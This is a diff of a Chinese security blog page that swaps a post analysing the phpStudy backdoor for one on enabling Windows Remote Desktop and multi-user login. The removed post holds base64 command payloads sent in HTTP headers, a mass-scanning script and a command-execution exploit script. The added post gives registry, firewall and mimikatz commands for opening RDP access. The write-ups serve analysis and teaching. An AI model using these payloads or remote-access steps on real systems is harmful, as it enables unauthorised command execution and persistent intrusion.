@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>phpstudy后门分析 · H0e4a0r1t&#39;s Blog</title>
+    <title>Windows系统远程桌面的多用户登录 · H0e4a0r1t&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">H0e4a0r1t&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">phpstudy后门分析</a>
+                <a href="#" class="post-name">Windows系统远程桌面的多用户登录</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            phpstudy后门分析
+            Windows系统远程桌面的多用户登录
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">797</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">544</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/09/30</span>
+                    <span class="post-intro-time">2019/10/15</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,40 +395,64 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>最近phpstudy后门一经爆出，震惊了安全圈，不知不觉的当了三年肉鸡-。-、</p>
-<p>都爆出好久了，我也跟风一波，分析一下，搞篇文章了，观摩众多大佬，划水一波算了：）</p>
-<h3 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01. 影响版本"></a>0x01. 影响版本</h3><ul>
-<li>phpStudy2016<br><code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>php\php-5.4.45\ext\php_xmlrpc.dll</code></li>
-<li>phpStudy2018<br><code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></li>
+        <h1 id="Windows系统远程桌面的多用户登录"><a href="#Windows系统远程桌面的多用户登录" class="headerlink" title="Windows系统远程桌面的多用户登录"></a>Windows系统远程桌面的多用户登录</h1><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00. 简介"></a>0x00. 简介</h3><p>介绍如下内容：</p>
+<ul>
+<li>开启远程桌面的方法</li>
+<li>使用mimikatz支持远程桌面多用户的原理</li>
+<li>改进思路</li>
+<li>测试工具rdpwrap</li>
 </ul>
-<h3 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02. 漏洞发现"></a>0x02. 漏洞发现</h3><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</span><br></pre></td></tr></table></figure>
-<p>存在<code>@eval(%s(&#39;%s&#39;));</code>即说明有后门。</p>
-<p><img src="https://i.loli.net/2019/09/30/XSOfq7MBtlN8Dds.png" alt></p>
-<h3 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03. 复现"></a>0x03. 复现</h3><p>复现环境：win7+phpStudy 2018(php-5.4.45+Apache)</p>
-<p><img src="https://i.loli.net/2019/09/30/bClN6ufzgmajTV9.png" alt="1.png"></p>
-<p>访问首页，抓包</p>
-<p><img src="https://i.loli.net/2019/09/30/MiEHkz4D9dlrfOC.png" alt="3.png"></p>
-<p>在请求头里构造 <code>Accept-Encoding</code> 和 <code>accept-charset</code> 即可。</p>
-<p>accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==       system(‘net user’);</p>
-<p>accept-charset: c3lzdGVtKCdpcGNvbmZpZycpIDs=      system(‘ipconfig’);</p>
-<p>accept-charset: c3lzdGVtKCd3aG9hbWknKSA7              system(‘whoami’);</p>
-<p><img src="https://i.loli.net/2019/09/30/8aQFKWdvCof26gD.png" alt="4.png"></p>
-<p><code>Accept-Encoding</code> 已经有了，但是这里注意：<br><strong>要把gzip, deflate 里逗号后面的空格去掉，不然命令执行不成功。</strong></p>
-<p><img src="https://i.loli.net/2019/09/30/HnqlzytRxsu2Zrm.png" alt="6.png"></p>
-<p>base64 转义建议小葵工具包</p>
-<h2 id="后门检测脚本"><a href="#后门检测脚本" class="headerlink" title="后门检测脚本"></a>后门检测脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import gevent</span><br><span class="line">from gevent import monkey</span><br><span class="line"></span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line">import requests as rq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def file_read(file_name=&quot;url.txt&quot;):</span><br><span class="line">    with open(file_name, &quot;r&quot;) as f:</span><br><span class="line">        return [i.replace(&quot;\n&quot;, &quot;&quot;) for i in f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(url):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    if &quot;http://&quot; or &quot;https://&quot; not in url:</span><br><span class="line">        url = &quot;https://&quot; + url</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Mode&apos;: &apos;navigate&apos;,</span><br><span class="line">        &apos;Sec-Fetch-User&apos;: &apos;?1&apos;,</span><br><span class="line">        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Site&apos;: &apos;none&apos;,</span><br><span class="line">        &apos;accept-charset&apos;: &apos;ZWNobyBlZVN6eHU5Mm5JREFiOw==&apos;,  # 输出 eeSzxu92nIDAb</span><br><span class="line">        &apos;Accept-Encoding&apos;: &apos;gzip,deflate&apos;,</span><br><span class="line">        &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        res = rq.get(url, headers=headers, timeout=20)</span><br><span class="line">        if res.status_code == 200:</span><br><span class="line">            if res.text.find(&apos;eeSzxu92nIDAb&apos;):</span><br><span class="line">                print(&quot;[存在漏洞] &quot; + url)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;[超时] &quot; + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(&quot;phpStudy 批量检测 (需要 gevent,requests 库)&quot;)</span><br><span class="line">    print(&quot;使用之前，请将URL保存为 url.txt 放置此程序同目录下&quot;)</span><br><span class="line">    input(&quot;任意按键开始执行..&quot;)</span><br><span class="line">    tasks = [gevent.spawn(check, url) for url in file_read()]</span><br><span class="line">    print(&quot;正在执行...请等候&quot;)</span><br><span class="line">    gevent.joinall(tasks)</span><br><span class="line">    wait = input(&quot;执行完毕 任意键退出...&quot;)</span><br></pre></td></tr></table></figure>
-<h2 id="后门执行脚本"><a href="#后门执行脚本" class="headerlink" title="后门执行脚本"></a>后门执行脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def backdoor(url, command=&quot;system(&apos;calc.exe&apos;);&quot;):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Mode&apos;: &apos;navigate&apos;,</span><br><span class="line">        &apos;Sec-Fetch-User&apos;: &apos;?1&apos;,</span><br><span class="line">        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Site&apos;: &apos;none&apos;,</span><br><span class="line">        &apos;accept-charset&apos;: &apos;c3lzdGVtKCdjYWxjLmV4ZScpOw==&apos;,</span><br><span class="line">        &apos;Accept-Encoding&apos;: &apos;gzip,deflate&apos;,</span><br><span class="line">        &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    command = base64.b64encode(command.encode(&apos;utf-8&apos;))</span><br><span class="line">    command = str(command, &apos;utf-8&apos;)</span><br><span class="line">    result = requests.get(url, headers=headers, verify=False)</span><br><span class="line">    if result.status_code == &quot;200&quot;:</span><br><span class="line">        print(&quot;执行完成&quot;)</span><br><span class="line">    a = input(&quot;任意键退出...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;输入URL(例如:http://127.0.0.1:228/xx.php)\n&quot;)</span><br><span class="line">command = input(&quot;输入命令 默认为 system(&apos;calc.exe&apos;); (不想输入直接回车)\n&quot;)</span><br><span class="line">backdoor(url, command)</span><br></pre></td></tr></table></figure>
-<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://www.cnblogs.com/liliyuanshangcao/p/11584397.html" target="_blank" rel="noopener">https://www.cnblogs.com/liliyuanshangcao/p/11584397.html</a></p>
+<h3 id="0x01-开启远程桌面的过程"><a href="#0x01-开启远程桌面的过程" class="headerlink" title="0x01. 开启远程桌面的过程"></a>0x01. 开启远程桌面的过程</h3><h4 id="1-查询系统是否允许3389远程连接"><a href="#1-查询系统是否允许3389远程连接" class="headerlink" title="1. 查询系统是否允许3389远程连接"></a>1. 查询系统是否允许3389远程连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/11/UQqjiM2nr5HpmRW.png" alt="10.png"></p>
+<p><img src="https://i.loli.net/2019/10/11/KoagFrwxCApsyBG.png" alt="11.png"></p>
+<p>1表示关闭，0表示开启</p>
+<p>查看远程连接的端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/11/1UGkBDVPuYzrc5x.png" alt="13.png"></p>
+<p>端口格式为16进制，0xd3d转换为10进制为3389</p>
+<p><img src="https://i.loli.net/2019/10/11/xPfdkzZ7EnKC39i.png" alt="12.png"></p>
+<h4 id="2-开启3389远程连接的方法"><a href="#2-开启3389远程连接的方法" class="headerlink" title="2. 开启3389远程连接的方法"></a>2. 开启3389远程连接的方法</h4><h5 id="方法1：通过cmd"><a href="#方法1：通过cmd" class="headerlink" title="方法1：通过cmd"></a>方法1：通过cmd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure>
+<h5 id="方法2：通过reg文件"><a href="#方法2：通过reg文件" class="headerlink" title="方法2：通过reg文件"></a>方法2：通过reg文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]</span><br><span class="line">&quot;fDenyTSConnections&quot;=dword:00000000</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]</span><br><span class="line">&quot;PortNumber&quot;=dword:00000d3d</span><br></pre></td></tr></table></figure>
+<p>导入注册表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit /s 3389.reg</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/11/a9ZeQwmlv2WNJ6q.png" alt="14.png"></p>
+<p><strong>注：</strong></p>
+<ol>
+<li><p>如果修改连接端口，系统重启后才能生效</p>
+</li>
+<li><p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口</p>
+</li>
+</ol>
+<p>修改防火墙配置，允许3389端口的命令如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
+<h4 id="3-远程连接方法"><a href="#3-远程连接方法" class="headerlink" title="3. 远程连接方法"></a>3. 远程连接方法</h4><p>kali连接3389远程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.1.1:3389</span><br></pre></td></tr></table></figure>
+<p>Windows连接3389远程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc.exe</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-非服务器版本的Windows系统默认只允许一个账户登录"><a href="#0x03-非服务器版本的Windows系统默认只允许一个账户登录" class="headerlink" title="0x03.非服务器版本的Windows系统默认只允许一个账户登录"></a>0x03.非服务器版本的Windows系统默认只允许一个账户登录</h3><ol>
+<li><p>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</p>
+<p><img src="https://i.loli.net/2019/10/11/Jl3z5syQ2d6cnp7.png" alt="16.png"></p>
+</li>
+<li><p>使用不同的账户，登录时提示其他用户已登录到此计算机</p>
+<p><img src="https://i.loli.net/2019/10/11/1XrQjpFZkSolwbc.png" alt="15.png"></p>
+</li>
+</ol>
+<p>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</p>
+<h3 id="0x03-非服务器版本的Windows系统支持多用户登录的方法"><a href="#0x03-非服务器版本的Windows系统支持多用户登录的方法" class="headerlink" title="0x03. 非服务器版本的Windows系统支持多用户登录的方法"></a>0x03. 非服务器版本的Windows系统支持多用户登录的方法</h3><h4 id="1-使用mimikatz（管理员权限运行）"><a href="#1-使用mimikatz（管理员权限运行）" class="headerlink" title="1. 使用mimikatz（管理员权限运行）"></a>1. 使用mimikatz（管理员权限运行）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">ts::multirdp</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/11/1vGfVjcDbXAxinJ.png" alt="17.png"></p>
+<p>开启多用户登录功能，最高支持Win7</p>
+<p><strong>使用与原系统相同的账户，还是会被切换到登陆页面；使用新建账户登录，登录成功</strong></p>
+<p><img src="https://i.loli.net/2019/10/11/eo784l2tw6NJLdm.png" alt="18.png"></p>
+<p><img src="https://i.loli.net/2019/10/11/HLNo38UKpBMJ6uD.png" alt="19.png"></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/09/30/phpstudy后门/">http://yoursite.com/2019/09/30/phpstudy后门/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/09/30/phpstudy后门/">September 30th 2019, 10:16:28 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/09/30/phpstudy后门/">September 30th 2019, 11:59:17 pm</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/10/15/Windows系统远程桌面的多用户登录/">http://yoursite.com/2019/10/15/Windows系统远程桌面的多用户登录/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/10/15/Windows系统远程桌面的多用户登录/">October 15th 2019, 10:51:24 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/10/15/Windows系统远程桌面的多用户登录/">October 15th 2019, 10:50:42 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -436,17 +460,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/10/01/Windows日志的删除与绕过/" title="Windows日志的删除与绕过">
-                    <div class="nextTitle">Windows日志的删除与绕过</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/09/30/新的开始/" title="新的开始">
-                    <div class="prevTitle">新的开始</div>
+                <a href="/2019/10/15/Windows系统的帐户隐藏/" title="Windows系统的帐户隐藏">
+                    <div class="prevTitle">Windows系统的帐户隐藏</div>
                 </a>
             
         </li>
@@ -565,7 +584,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-影响版本"><span class="toc-number">1.</span> <span class="toc-text">0x01. 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞发现"><span class="toc-number">2.</span> <span class="toc-text">0x02. 漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-复现"><span class="toc-number">3.</span> <span class="toc-text">0x03. 复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门检测脚本"><span class="toc-number"></span> <span class="toc-text">后门检测脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门执行脚本"><span class="toc-number"></span> <span class="toc-text">后门执行脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考："><span class="toc-number">1.</span> <span class="toc-text">参考：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows系统远程桌面的多用户登录"><span class="toc-number">1.</span> <span class="toc-text">Windows系统远程桌面的多用户登录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x00. 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-开启远程桌面的过程"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x01. 开启远程桌面的过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-查询系统是否允许3389远程连接"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">1. 查询系统是否允许3389远程连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-开启3389远程连接的方法"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">2. 开启3389远程连接的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#方法1：通过cmd"><span class="toc-number">1.0.2.2.1.</span> <span class="toc-text">方法1：通过cmd</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#方法2：通过reg文件"><span class="toc-number">1.0.2.2.2.</span> <span class="toc-text">方法2：通过reg文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-远程连接方法"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">3. 远程连接方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-非服务器版本的Windows系统默认只允许一个账户登录"><span class="toc-number">1.0.3.</span> <span class="toc-text">0x03.非服务器版本的Windows系统默认只允许一个账户登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-非服务器版本的Windows系统支持多用户登录的方法"><span class="toc-number">1.0.4.</span> <span class="toc-text">0x03. 非服务器版本的Windows系统支持多用户登录的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-使用mimikatz（管理员权限运行）"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">1. 使用mimikatz（管理员权限运行）</span></a></li></ol></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
